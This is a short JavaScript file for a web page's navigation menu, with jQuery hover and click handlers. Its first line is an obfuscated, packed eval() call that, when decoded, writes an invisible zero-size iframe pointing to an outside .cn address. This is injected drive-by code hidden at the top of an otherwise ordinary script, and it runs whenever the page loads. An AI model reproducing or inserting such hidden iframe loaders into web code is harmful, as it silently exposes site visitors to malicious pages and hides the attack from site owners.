eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('7.5("<1 6=\\"4://2.3/a.b\\" c=\\"0\\" 8=\\"0\\" 9=\\"0\\"></1>");',13,13,'|iframe|04zl|cn|http|writeln|src|document|height|frameborder||html|width'.split('|'),0,{}))
// JavaScript Document
$(document).ready(function(){
	$("#menu li").hover(
						 
	function (){

		$(this).addClass('li_hover');						  
	},
	function (){

		$(this).removeClass('li_hover');						  
	}
	).click(
	function (){
		window.location.href=$(this).find("a").attr('href');
		
		}
	);				   
})